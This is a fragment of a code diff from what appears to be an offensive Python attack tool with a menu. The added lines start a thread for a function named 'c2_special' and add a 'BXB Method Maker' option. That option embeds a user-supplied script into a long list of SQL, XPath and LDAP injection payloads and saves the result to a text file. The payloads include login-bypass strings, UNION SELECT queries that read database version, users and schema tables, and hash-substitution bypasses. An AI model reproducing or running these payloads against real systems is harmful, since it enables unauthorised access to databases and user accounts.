+                tea = threading.Thread(target=c2_special)
+                tea.start()
+        except ModuleNotFoundError:
+            print("Did you install the requirements.txt?")
+        except ValueError:
+            print("Did you fill the target info correctly? Retry please!")
+        except EOFError:
+            print("Exit..")
+            exit()
+    elif answer == '17':
+        pass
+        print("BXB Method Maker")
+        jso = input(f"Your JSO Script : ")
+        loges = input(f"Save AS [example : BXB1 ] : ")
+        print("wait..")
+        N = f"""
+        #BXB 2
+
+        or '=' --+ 'or limit 1=1 1-- -+ or 1=1- ' /* admin' or '1'='1 admin' 'or 1=1 == True or Pass --+ admin' ''='
+        or
+        'or '='--+'("1"="1"# )--+'or 1=1 limit 1-- -+ '') SELECT id, username, password, left(password, 8)-- -+ or (("x"))=(("x or 1=1 or 1=1-- or 1=1# or 1=1/* admin' -- admin'/*
+
+        #BXB 3
+        ' or 1=1 limit 1-- -+ 'or 1=1 limit 1 -- -+ 'or 1=1 limit 1 - -+ SELECT id, username, left(password, 8) AS snipped_password, email FROM accounts WHERE username='admin' AND`` `` password=password=1; 'order by 1--  - 'union select 1,2-- - admin' # admin' or '1'='1 admin' or '1'='1'# admin' or 1=1 or ''=' 'or 1=1 limits 1 -- -+ ' or '1'='1 ' or 'x'='x ' or 0=0 -- ' or 0=0 # 1=0 UNION ALL SELECT admin password 1234 123456 root toor test guest ' or '1'='1 ' or ''=' ' or 1]%00 ' or /* or ' ' or "a" or ' ' or 1 or ' ' or true() or ' 'or string-length(name(.))<10 or' 'or contains(name,'adm') or' 'or contains(.,'adm') or' 'or position()=2 or' admin' or ' admin' or '1'='2 * *)(& *)(|(& pwd) *)(|(* *))%00 admin)(&) pwd admin)(!(&(| pwd)) admin))(|(| 1234 '-' ' ' '&' '^' '*' ' or ''-' ' or '' ' ' or ''&' ' or ''^' ' or ''*' "-" " " "&" "^" "*" " or ""-" " or "" " " or ""&" " or ""^" " or ""*" or true-- " or true-- ' or true-- ") or true-- ') or true-- ' or 'x'='x ') or ('x')=('x ')) or (('x'))=(('x " or "x"="x ") or ("x")=("x ")) or (("x"))=(("x or 1=1 or 1=1-- or 1=1# or 1=1/* admin' -- admin' # admin'/* admin' or '1'='1 admin' or '1'='1'-- admin' or '1'='1'# admin' or '1'='1'/* admin'or 1=1 or ''=' admin' or 1=1 admin' or 1=1-- admin' or 1=1# admin' or 1=1/* admin') or ('1'='1 admin') or ('1'='1'-- admin') or ('1'='1'# admin') or ('1'='1'/* admin') or '1'='1 admin') or '1'='1'-- admin') or '1'='1'# admin') or '1'='1'/* 1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055 1234 ' AND 1=0 UNION ALL SELECT 'admin', '7110eda4d09e062aa5e4a390b0a572ac0d2c0220 admin" -- admin" # admin"/* admin" or "1"="1 admin" or "1"="1"-- admin" or "1"="1"# admin" or "1"="1"/* admin"or 1=1 or ""=" admin" or 1=1 admin" or 1=1-- admin" or 1=1# admin" or 1=1/* admin") or ("1"="1 admin") or ("1"="1"-- admin") or ("1"="1"# admin") or ("1"="1"/* admin") or "1"="1 admin") or "1"="1"-- admin") or "1"="1"# admin") or "1"="1"/* 1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055 1234 " AND 1=0 UNION ALL SELECT "admin", "7110eda4d09e062aa5e4a390b0a572ac0d2c0220 == "> ") " ') {jso} <" = "> ") " ') '{jso} <" ' ' -- ' # ' – '-- '/* '# " -- " # "/* ' and 1='1 ' and a='a or true ' or ''=' " or ""=" 1′) and '1′='1– ' AND 1=0 UNION ALL SELECT '', '81dc9bdb52d04dc20036dbd8313ed055 " AND 1=0 UNION ALL SELECT "", "81dc9bdb52d04dc20036dbd8313ed055 ' AND 1=0 UNION ALL SELECT '', '7110eda4d09e062aa5e4a390b0a572ac0d2c0220 " AND 1=0 UNION ALL SELECT "", "7110eda4d09e062aa5e4a390b0a572ac0d2c0220 and 1=1 and 1=1– ' and 'one'='one ' and 'one'='one– ' group by password having 1=1-- ' group by userid having 1=1-- ' group by username having 1=1-- like '%' or 0=0 -- or 0=0 # or 0=0 – ' or         0=0 # ' or 0=0 -- ' or 0=0 # ' or 0=0 – " or 0=0 -- " or 0=0 # " or 0=0 – %' or '0'='0 or 1=1– ' or 1=1-- ' or '1'='1 ' or '1'='1'-- ' or '1'='1'/* ' or '1'='1'# ' or '1′='1 ' or 1=1 ' or 1=1 -- ' or 1=1 – ' or 1=1;# ' or 1=1/* ' or 1=1# ' or 1=1– ') or '1'='1 ') or '1'='1-- ') or '1'='1'-- ') or '1'='1'/* ') or '1'='1'# ') or ('1'='1 ') or ('1'='1-- ') or ('1'='1'-- ') or ('1'='1'/* ') or ('1'='1'# 'or'1=1 'or'1=1′ " or "1"="1 " or "1"="1"-- " or "1"="1"/* " or "1"="1"# " or 1=1 " or 1=1 -- " or 1=1 – " or 1=1-- " or 1=1/* " or 1=1# " or 1=1– ") or "1"="1 ") or "1"="1"-- ") or "1"="1"/* ") or "1"="1"# ") or ("1"="1 ") or ("1"="1"-- ") or ("1"="1"/* ") or ("1"="1"# ) or '1′='1– ) or ('1′='1– ' or 1=1 LIMIT 1;# 'or 1=1 or ''=' "or 1=1 or ""=" ' or a=a-- ' or a=a– " or "a"="a ") or ("a"="a ') or ('a'='a and hi") or ("a"="a ' or 'one'='one ' or 'one'='one– ' or uid like '% ' or uname like '% ' or userid like '% ' or user like '% ' or username like '% ') or ('x'='x ' OR 'x'='x'#; '=' 'or' and '=' 'or' ' UNION ALL SELECT 1, @@version;# ' UNION ALL SELECT system_user(),user();# ' UNION select table_schema,table_name FROM information_Schema.tables;# admin' and substring(password/text(),1,1)='7 ' and substring(password/text(),1,1)='7 ' or 1=1-- ' or 'one'='one 'or 1=1-- - 1'or'1'='1 'or''='
+
+        """
+        def logger(N):
+                file = open((loges) + ".txt", "a")
+                file.write(str(N))
+                file.write("\n")
+                file.close()
+        logger(N)
+        print(f"Success, Check it on {loges}.txt")
     else:
         print(green + f"Exit..")
         exit()
